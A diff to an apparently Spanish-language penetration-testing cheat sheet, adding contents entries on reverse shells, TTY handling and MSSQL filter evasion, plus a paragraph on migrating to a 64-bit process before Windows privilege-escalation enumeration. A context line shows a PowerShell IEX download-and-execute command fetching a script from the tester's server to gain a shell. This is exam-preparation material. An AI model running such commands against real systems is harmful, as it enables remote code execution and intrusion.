@@ -33,10 +33,12 @@
        * [Fuerza Bruta en Formularios](#fuerza-bruta-en-formularios)
        * [Enumeración de Usuarios en Paneles de Autenticación](#login-user-enumeration)
        * [PHP Reverse Shell](#php-reverse-shell)
+       * [PHP Reverse Shell Manual Multifuncional](#php-reverse-shell-manual-multifuncional)       
        * [ASP/ASPX Reverse Shell](#asp-aspx-reverse-shell)
        * [NoTCPShell](#notcpshell)
        * [Burpsuite](#burpsuite)     
      * [Pentesting Linux](#pentesting-linux)
+        * [Tratamiento de la TTY](#tratamiento-de-la-tty)
         * [Monitorizado de Procesos a Tiempo Real](#process-monitoring)
      * [Pentesting Windows](#pentesting-windows)
         * [Transferencia de Archivos](#transferencia-de-archivos)
@@ -46,7 +48,8 @@
         * [PassTheHash](#passthehash)
         * [Enumeration & Privilege Escalation](#enumeration-and-privilege-escalation)
         * [Powershell Reverse Shell](#powershell-reverse-shell)
-        * [Migración manual a proceso a 64 bits](#manual-migrate-process)
+        * [Migración manual a proceso a 64 bits](#manual-migration-process)
+        * [RCE Filter Evasion Microsoft SQL](#rce-filter-evasion-microsoft-sql)
 
           
 Antecedentes
@@ -1574,5 +1577,7 @@ powershell IEX(New-Object Net.WebClient).downloadString('http://tuIP:8080/Invoke
 
 En cuestión de unos segundos, veremos como se recibe un **GET** del lado de nuestro servidor e inmediatamente ganamos acceso al sistema vía **PowerShell**.
 
-#### Manual Migrate Process
+#### Manual Migration Process
+
+Aunque las máquinas Windows del examen suelen ser de 32 bits, como más vale prevenir que curar detallo una técnica para migrar de un proceso de 32 bits a uno de 64 bits. Cabe decir que este procedimiento es importante de cara a la correcta enumeración del sistema, pues en caso de figurar en un proceso que no corra bajo la arquitectura de la máquina, tanto **Sherlock**, como **PowerUp.ps1** como incluso el propio **suggester** de Metasploit, darán montón de falsos positivos.
 
